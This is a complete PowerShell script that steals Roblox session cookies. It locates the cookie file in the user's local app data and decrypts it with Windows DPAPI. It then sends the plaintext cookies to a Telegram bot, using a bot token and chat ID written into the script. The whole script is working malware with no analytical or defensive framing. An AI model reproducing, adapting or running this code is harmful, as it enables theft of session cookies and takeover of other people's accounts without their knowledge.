# Load the required assembly
Add-Type -AssemblyName System.Security

# Define the file path
$filePath = "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"

# Check if the file exists
if (Test-Path $filePath) {
    try {
        # Read and parse the file
        $jsonContent = Get-Content $filePath | ConvertFrom-Json
        
        # Decode the base64 string
        $encryptedBytes = [Convert]::FromBase64String($jsonContent.CookiesData)
        
        # Decrypt the data
        $decryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
        
        # Convert to string
        $cookies = [Text.Encoding]::UTF8.GetString($decryptedBytes)
        
        # Send to Telegram
        $botToken = "8585418158:AAHA7g-QZWdChwoMl9OBdec5VABL0mI-5b0"
        $chatId = "8041986198"
        $url = "https://api.telegram.org/bot$botToken/sendMessage"
        
        $body = @{
            chat_id = $chatId
            text = $cookies
        }
        
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body
        Write-Host "Cookies sent successfully"
    }
    catch {
        Write-Host "Error: $($_.Exception.Message)"
    }
}
else {
    Write-Host "Cookie file not found at: $filePath"
}
